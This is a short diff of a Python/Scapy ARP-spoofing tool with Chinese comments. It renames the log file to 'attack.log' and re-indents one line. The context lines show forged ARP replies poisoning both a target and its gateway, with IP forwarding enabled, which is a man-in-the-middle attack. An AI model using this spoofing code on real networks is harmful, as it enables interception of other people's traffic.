@@ -10,7 +10,7 @@ import recordinfo
 import logging
 
 
-logfile = "log/record.log"
+logfile = "log/attack.log"
 
 
 class RecordThreading (threading.Thread):
@@ -77,7 +77,7 @@ def spoof(interface, tip, gip):  # 获取命令行的输入实现arp攻击
     ptarget = Ether(src=localmac, dst=tmac)/ARP(hwsrc=localmac, psrc=gip,
                                                 hwdst=tmac, pdst=tip, op=2)  # 构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
     pgateway = Ether(src=localmac, dst=gmac)/ARP(hwsrc=localmac, psrc=tip,
-                                                 hwdst=gmac, pdst=gip, op=2)  # 构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
+                                                hwdst=gmac, pdst=gip, op=2)  # 构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
     print tmac, gmac, localmac
     ipforwarding(1)
     try:
